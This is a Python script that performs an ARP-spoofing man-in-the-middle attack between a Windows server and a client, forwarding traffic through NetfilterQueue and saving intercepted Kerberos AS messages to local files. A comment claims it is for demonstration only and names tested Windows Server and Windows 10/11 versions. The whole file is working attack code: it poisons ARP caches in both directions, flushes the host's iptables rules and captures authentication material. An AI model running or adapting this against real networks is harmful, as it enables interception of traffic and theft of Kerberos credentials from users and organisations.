from netfilterqueue import NetfilterQueue
import scapy.all as scapy
import os
import struct
import sys

#PARAMS: SERVER_IP, TARGET_IP, INTERFACE
#Caution this script was for demonstration only this is not meant for production testing purposes
#Tested devices were WS2016,2019,2022 with W10 clients and W11 client

os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -F")
os.system("iptables -F -t nat")
os.system("iptables -A FORWARD -j NFQUEUE --queue-num 0")
os.system("arpspoof -i " + sys.argv[3]  + " " + sys.argv[1] + " -t " + sys.argv[2] + "> /dev/null 2>&1 &")
os.system("arpspoof -i " + sys.argv[3]  + " " + sys.argv[2] + " -t " + sys.argv[1] + "> /dev/null 2>&1 &")

def is_kerberos(raw_data): #function which tests if this message is a keberos AS message
    if len(raw_data) < 9:
        return False, 0  # Not enough data to be a Kerberos message

    if raw_data[0:2] != b'\x00\x00':
        return False, 0  # Usually not a Kerberos message

    if raw_data[4:6] == b'\x6a\x82':
        return True, 1  # Type 2 message
    elif raw_data[4:6] == b'\x6a\x81':
        return True, 2  # Type 1 message
    else:
        return False, 0 


def capture_message(packet):
    ip_packet = scapy.IP(packet.get_payload())
    ip_src = ip_packet[scapy.IP].src
    ip_dst = ip_packet[scapy.IP].dst
    if ip_src == sys.argv[1]: # any traffic from the server doesn't need to be inspected or modified
        packet.accept() 
        return  
    if ip_packet.haslayer(scapy.Raw) and ip_packet.haslayer(scapy.TCP) and ip_src == sys.argv[2]: 
        raw_data = ip_packet[scapy.Raw].load
        check, msg_t = is_kerberos(raw_data)
        if check:#don't care since i only need the messag
                if msg_t == 2:
                    print("capturing non auth message")
                    file = open(f"captured_message","wb")
                    file.write(raw_data)
                    file.close()
                if msg_t == 1:
                    print("capturing auth message")
                    file = open(f"captured_message_auth","wb")
                    file.write(raw_data)
                    file.close()
                else:
                    print(f"Message type {msg_t}")
                packet.accept()
                return
        else: #anything that isn't a kerberos message gets passed
            packet.accept()
            return
    else:
        packet.accept()
        return
    return

nf_queue = NetfilterQueue()
nf_queue.bind(0, capture_message)

try:
    nf_queue.run()
except KeyboardInterrupt:
    os.system("iptables -F")
    os.system("iptables -F -t nat")

nf_queue.unbind()
